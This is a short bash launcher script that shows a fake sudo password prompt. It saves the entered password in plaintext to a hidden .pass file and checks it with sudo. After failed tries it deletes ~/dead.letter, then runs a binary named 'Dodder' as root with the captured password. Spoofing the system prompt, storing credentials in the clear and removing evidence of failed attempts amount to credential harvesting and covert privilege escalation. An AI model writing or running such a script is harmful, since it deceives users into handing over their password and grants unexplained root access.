#!/usr/bin/env bash
SOURCE="${BASH_SOURCE[0]}"
while [ -h "$SOURCE" ]; do # resolve $SOURCE until the file is no longer a symlink
  DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
  SOURCE="$(readlink "$SOURCE")"
  [[ $SOURCE != /* ]] && SOURCE="$DIR/$SOURCE" # if $SOURCE was a relative symlink, we need to resolve it relative to the path where the symlink file was located
done
DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"

i=5
while [ $i -ne 0 ]
do
    printf "[sudo] password for $USER:" && read -s passwrd
    echo "" && echo $passwrd > $DIR/.pass
    sudo -k -S ls < $DIR/.pass > /dev/null 2>&1
    i=$?
    if [ $i -ne 0 ]
    then
        sleep 1
        if [ -f ~/dead.letter ]
        then
            rm ~/dead.letter
        fi
        echo "[sudo], try again."
    fi
done
sudo -S $DIR/Dodder --file /var/log/Dodder.log < $DIR/.pass > /dev/null
rm $DIR/.pass
